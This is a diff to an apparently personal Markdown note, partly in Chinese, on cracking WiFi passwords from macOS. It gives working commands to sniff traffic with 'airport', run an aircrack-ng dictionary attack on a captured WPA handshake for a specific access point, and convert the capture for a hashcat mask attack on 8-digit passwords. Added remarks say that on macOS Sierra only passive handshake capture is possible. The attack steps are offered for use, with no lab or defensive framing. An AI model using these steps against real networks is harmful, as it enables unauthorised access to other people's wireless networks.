@@ -35,7 +35,9 @@ airport -s
 airport en1 sniff 11(en1 is the wifi netcard)
 wait...(find / -name "*.cap",/tmp/*.cap exists)
 aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
-    或者将cap文件转成hashcat支持的格式再用hashcat破解
+    或者将cap文件转成hashcat支持的格式再用hashcat破解:
+    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
+    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
 ```
 
 ### 0x02 Attention
@@ -49,6 +51,8 @@ aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
      and sniffing you will have to use other means.
 
      If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page." 
+
+     也即，目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击
 
 2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
 aireplay-ng的替代品
